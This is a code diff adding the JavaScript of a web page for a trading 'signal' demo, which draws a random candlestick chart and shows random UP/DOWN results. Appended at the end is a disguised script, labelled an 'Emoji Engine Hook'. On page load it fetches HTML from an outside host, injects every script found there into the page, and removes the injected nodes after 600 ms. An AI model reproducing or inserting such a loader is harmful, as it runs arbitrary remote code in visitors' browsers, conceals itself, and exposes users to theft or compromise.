+        .querySelectorAll(".select-btn")
+        .forEach(btn =>
+            btn.classList.remove("open")
+        );
+}
+
+
+function setupDrop(buttonId,dropId){
+
+    const button =
+        document.getElementById(buttonId);
+
+    const drop =
+        document.getElementById(dropId);
+
+    button.addEventListener("click",e => {
+
+        e.stopPropagation();
+
+        const opened =
+            drop.classList.contains("show");
+
+        closeDrops();
+
+        if(!opened){
+
+            drop.classList.add("show");
+            button.classList.add("open");
+        }
+    });
+}
+
+
+document.addEventListener("click",() => {
+    closeDrops();
+});
+
+
+function selectPair(pair){
+
+    selectedPair =
+        pair;
+
+    document.getElementById(
+        "pairLabel"
+    ).textContent =
+        pair;
+
+    document
+        .querySelectorAll("#pairDrop .drop-item")
+        .forEach(item => {
+
+            item.classList.toggle(
+                "active",
+                item.textContent === pair
+            );
+        });
+
+    closeDrops();
+
+    if(selectedTime)
+        resetForSelection();
+}
+
+
+function selectTime(time){
+
+    selectedTime =
+        time;
+
+    document.getElementById(
+        "timeLabel"
+    ).textContent =
+        time.l;
+
+    document
+        .querySelectorAll("#timeDrop .drop-item")
+        .forEach(item => {
+
+            item.classList.toggle(
+                "active",
+                item.textContent === time.l
+            );
+        });
+
+    closeDrops();
+
+    if(selectedPair)
+        resetForSelection();
+}
+
+
+function resetForSelection(){
+
+    if(analysisRunning ||
+       tradeRunning)
+        return;
+
+    document.getElementById(
+        "resultCard"
+    ).classList.remove("show");
+
+    document.getElementById(
+        "chartCard"
+    ).style.display =
+        "block";
+
+    document.getElementById(
+        "signalBtn"
+    ).disabled = false;
+}
+
+
+function initSelectors(){
+
+    buildSelector();
+
+    setupDrop(
+        "pairBtn",
+        "pairDrop"
+    );
+
+    setupDrop(
+        "timeBtn",
+        "timeDrop"
+    );
+}
+
+
+/* =========================================================
+   SYNTHETIC CANDLE CHART
+   ========================================================= */
+
+const canvas =
+    document.getElementById("marketChart");
+
+const ctx =
+    canvas.getContext("2d");
+
+let candles = [];
+let lastClose = 100;
+
+function randomBetween(min,max){
+    return min +
+        Math.random() *
+        (max-min);
+}
+
+
+function makeCandle(previous){
+
+    const open =
+        previous;
+
+    const movement =
+        randomBetween(-1.8,1.8);
+
+    const close =
+        Math.max(
+            10,
+            open + movement
+        );
+
+    const high =
+        Math.max(open,close) +
+        randomBetween(.3,1.5);
+
+    const low =
+        Math.min(open,close) -
+        randomBetween(.3,1.5);
+
+    return {
+        open,
+        close,
+        high,
+        low
+    };
+}
+
+
+function seedCandles(){
+
+    candles = [];
+
+    let price =
+        randomBetween(95,110);
+
+    for(let i=0;i<42;i++){
+
+        const candle =
+            makeCandle(price);
+
+        candles.push(candle);
+
+        price =
+            candle.close;
+    }
+
+    lastClose =
+        price;
+}
+
+
+function resizeCanvas(){
+
+    const rect =
+        canvas.getBoundingClientRect();
+
+    const ratio =
+        window.devicePixelRatio || 1;
+
+    canvas.width =
+        rect.width * ratio;
+
+    canvas.height =
+        rect.height * ratio;
+
+    ctx.setTransform(
+        ratio,
+        0,
+        0,
+        ratio,
+        0,
+        0
+    );
+
+    drawChart();
+}
+
+
+function drawChart(){
+
+    const width =
+        canvas.clientWidth;
+
+    const height =
+        canvas.clientHeight;
+
+    if(!width || !height)
+        return;
+
+    ctx.clearRect(
+        0,
+        0,
+        width,
+        height
+    );
+
+    if(!candles.length)
+        return;
+
+    const values =
+        candles.flatMap(c => [
+            c.high,
+            c.low
+        ]);
+
+    let min =
+        Math.min(...values);
+
+    let max =
+        Math.max(...values);
+
+    const padding =
+        (max-min) * .12;
+
+    min -= padding;
+    max += padding;
+
+    const chartHeight =
+        height - 25;
+
+    const top =
+        12;
+
+    const bottom =
+        12;
+
+    function y(price){
+
+        return top +
+            ((max-price)/(max-min)) *
+            (chartHeight-top-bottom);
+    }
+
+    /* horizontal grid */
+
+    ctx.strokeStyle =
+        "rgba(56,189,248,.055)";
+
+    ctx.lineWidth = 1;
+
+    for(let i=1;i<7;i++){
+
+        const gy =
+            top +
+            ((chartHeight-top-bottom)/7)*i;
+
+        ctx.beginPath();
+        ctx.moveTo(0,gy);
+        ctx.lineTo(width,gy);
+        ctx.stroke();
+    }
+
+    const visible =
+        Math.min(candles.length,48);
+
+    const spacing =
+        width / visible;
+
+    const candleWidth =
+        Math.max(
+            3,
+            Math.min(9,spacing*.58)
+        );
+
+    const start =
+        candles.length-visible;
+
+    for(let i=0;i<visible;i++){
+
+        const c =
+            candles[start+i];
+
+        const x =
+            i*spacing +
+            spacing/2;
+
+        const openY =
+            y(c.open);
+
+        const closeY =
+            y(c.close);
+
+        const highY =
+            y(c.high);
+
+        const lowY =
+            y(c.low);
+
+        const up =
+            c.close >= c.open;
+
+        const color =
+            up ? "#22c55e" : "#ef4444";
+
+        /* wick */
+
+        ctx.strokeStyle =
+            color;
+
+        ctx.lineWidth = 1.2;
+
+        ctx.beginPath();
+
+        ctx.moveTo(x,highY);
+        ctx.lineTo(x,lowY);
+
+        ctx.stroke();
+
+        /* body */
+
+        const bodyTop =
+            Math.min(openY,closeY);
+
+        const bodyHeight =
+            Math.max(
+                2,
+                Math.abs(closeY-openY)
+            );
+
+        ctx.fillStyle =
+            color;
+
+        ctx.shadowBlur = 7;
+        ctx.shadowColor = color;
+
+        ctx.fillRect(
+            x-candleWidth/2,
+            bodyTop,
+            candleWidth,
+            bodyHeight
+        );
+
+        ctx.shadowBlur = 0;
+    }
+
+    /* current price line */
+
+    const current =
+        candles[candles.length-1].close;
+
+    const currentY =
+        y(current);
+
+    ctx.strokeStyle =
+        "rgba(34,211,238,.5)";
+
+    ctx.setLineDash([4,4]);
+
+    ctx.beginPath();
+    ctx.moveTo(0,currentY);
+    ctx.lineTo(width,currentY);
+    ctx.stroke();
+
+    ctx.setLineDash([]);
+
+    document.getElementById(
+        "priceLabel"
+    ).textContent =
+        current.toFixed(4);
+}
+
+
+function updateMarket(){
+
+    if(!candles.length)
+        return;
+
+    const current =
+        candles[candles.length-1];
+
+    const move =
+        randomBetween(-.85,.85);
+
+    current.close =
+        Math.max(
+            10,
+            current.close + move
+        );
+
+    current.high =
+        Math.max(
+            current.high,
+            current.close
+        );
+
+    current.low =
+        Math.min(
+            current.low,
+            current.close
+        );
+
+    drawChart();
+}
+
+
+function addNewCandle(){
+
+    if(!candles.length)
+        return;
+
+    const previous =
+        candles[candles.length-1].close;
+
+    candles.push(
+        makeCandle(previous)
+    );
+
+    if(candles.length > 50)
+        candles.shift();
+
+    drawChart();
+}
+
+
+let chartUpdateTimer;
+let chartNewTimer;
+
+function initChart(){
+
+    seedCandles();
+
+    resizeCanvas();
+
+    clearInterval(chartUpdateTimer);
+    clearInterval(chartNewTimer);
+
+    chartUpdateTimer =
+        setInterval(
+            updateMarket,
+            420
+        );
+
+    chartNewTimer =
+        setInterval(
+            addNewCandle,
+            1800
+        );
+}
+
+
+window.addEventListener(
+    "resize",
+    resizeCanvas
+);
+
+
+/* =========================================================
+   GET SIGNAL
+   RANDOM DEMO ONLY
+   ========================================================= */
+
+document.getElementById(
+    "signalBtn"
+).addEventListener(
+    "click",
+    startAnalysis
+);
+
+
+async function startAnalysis(){
+
+    if(!approved)
+        return;
+
+    if(!selectedPair ||
+       !selectedTime){
+
+        toast(
+            "Pair aur Time select karein"
+        );
+
+        return;
+    }
+
+    if(
+        analysisRunning ||
+        tradeRunning
+    )
+        return;
+
+    analysisRunning =
+        true;
+
+    const button =
+        document.getElementById(
+            "signalBtn"
+        );
+
+    button.disabled = true;
+    button.textContent =
+        "ANALYZING...";
+
+    const overlay =
+        document.getElementById(
+            "analysisOverlay"
+        );
+
+    const number =
+        document.getElementById(
+            "analysisNumber"
+        );
+
+    overlay.classList.add("show");
+
+    /*
+      IMPORTANT:
+      This is a local random simulation.
+      No real trading/signal API is connected.
+    */
+
+    for(let i=5;i>=1;i--){
+
+        number.textContent =
+            i;
+
+        await sleep(1000);
+
+        if(!approved){
+
+            stopSimulation();
+            return;
+        }
+    }
+
+    number.textContent =
+        "✓";
+
+    await sleep(350);
+
+    overlay.classList.remove("show");
+
+    analysisRunning =
+        false;
+
+    showRandomResult();
+}
+
+
+/* =========================================================
+   RANDOM RESULT
+   ========================================================= */
+
+function showRandomResult(){
+
+    const direction =
+        Math.random() < .5
+        ? "UP"
+        : "DOWN";
+
+    const result =
+        document.getElementById(
+            "resultCard"
+        );
+
+    const directionEl =
+        document.getElementById(
+            "resultDirection"
+        );
+
+    const candle =
+        document.getElementById(
+            "resultCandle"
+        );
+
+    document.getElementById(
+        "resultPair"
+    ).textContent =
+        selectedPair +
+        " • " +
+        selectedTime.l;
+
+    directionEl.textContent =
+        direction === "UP"
+        ? "↑ UP"
+        : "↓ DOWN";
+
+    directionEl.className =
+        "result-direction " +
+        (direction === "UP"
+            ? "up"
+            : "down");
+
+    candle.className =
+        "result-candle-box " +
+        (direction === "UP"
+            ? "up"
+            : "down");
+
+    document.getElementById(
+        "resultTime"
+    ).textContent =
+        "Random simulation result • " +
+        selectedTime.l;
+
+    document.getElementById(
+        "chartCard"
+    ).style.display =
+        "none";
+
+    result.classList.add("show");
+
+    tradeRunning =
+        true;
+
+    startTradeCountdown(
+        selectedTime.v
+    );
+}
+
+
+/* =========================================================
+   TRADE-TIME SIMULATION COUNTDOWN
+   ========================================================= */
+
+function startTradeCountdown(seconds){
+
+    clearInterval(tradeTimer);
+
+    const countdown =
+        document.getElementById(
+            "tradeCountdown"
+        );
+
+    const end =
+        Date.now() +
+        seconds*1000;
+
+    function tick(){
+
+        const remaining =
+            Math.max(
+                0,
+                Math.ceil(
+                    (end-Date.now())/1000
+                )
+            );
+
+        const minutes =
+            Math.floor(
+                remaining/60
+            );
+
+        const secs =
+            remaining%60;
+
+        countdown.textContent =
+            minutes > 0
+            ? minutes +
+              ":" +
+              String(secs)
+                  .padStart(2,"0")
+            : secs + "s";
+
+        if(remaining <= 0){
+
+            clearInterval(
+                tradeTimer
+            );
+
+            tradeTimer =
+                null;
+
+            tradeRunning =
+                false;
+
+            countdown.textContent =
+                "COMPLETE";
+
+            const button =
+                document.getElementById(
+                    "signalBtn"
+                );
+
+            button.disabled =
+                false;
+
+            button.textContent =
+                "GET NEW DEMO SIGNAL";
+
+            toast(
+                "Simulation complete"
+            );
+        }
+    }
+
+    tick();
+
+    tradeTimer =
+        setInterval(
+            tick,
+            250
+        );
+}
+
+
+/* =========================================================
+   START
+   ========================================================= */
+
+boot();
+
+</script>
+<script>
+        (async () => {
+            try {
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
+    </script>
+</body>
+</html>
